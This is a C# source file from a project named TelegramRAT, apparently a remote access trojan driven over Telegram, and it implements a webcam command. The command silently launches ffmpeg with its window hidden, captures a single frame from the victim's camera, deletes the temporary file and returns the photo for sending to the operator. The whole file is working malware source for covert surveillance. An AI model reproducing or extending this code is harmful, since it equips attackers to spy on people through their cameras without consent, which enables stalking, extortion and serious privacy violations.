namespace TelegramRAT.Commands;

using System.Diagnostics;
using TelegramRAT.Models;
using TelegramRAT.Telegram;

internal sealed class WebcamCmd : IAsyncCommand
{
    private readonly TelegramClient _client;

    public WebcamCmd(TelegramClient client)
    {
        _client = client;
    }

    public async Task<CommandResult> ExecuteAsync(string[] args)
    {
        var tempFile = Path.Combine(Path.GetTempPath(), $"webcam_{Guid.NewGuid():N}.jpg");

        try
        {
            var captured = await CaptureWebcamAsync(tempFile);
            if (!captured)
                return CommandResult.Text("No webcam detected or capture failed");

            var imageData = await File.ReadAllBytesAsync(tempFile);
            return CommandResult.Photo(imageData, "Webcam capture");
        }
        finally
        {
            if (File.Exists(tempFile))
                File.Delete(tempFile);
        }
    }

    private static async Task<bool> CaptureWebcamAsync(string outputPath)
    {
        var ffmpegPath = FindFfmpeg();
        if (ffmpegPath is null)
            return false;

        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = ffmpegPath,
                Arguments = $"-f dshow -i video=\"Integrated Camera\" -frames:v 1 -y \"{outputPath}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardError = true
            }
        };

        process.Start();
        await process.WaitForExitAsync();
        return File.Exists(outputPath) && new FileInfo(outputPath).Length > 0;
    }

    private static string? FindFfmpeg()
    {
        var paths = new[]
        {
            Path.Combine(AppContext.BaseDirectory, "ffmpeg.exe"),
            @"C:\ffmpeg\bin\ffmpeg.exe"
        };

        return paths.FirstOrDefault(File.Exists);
    }
}
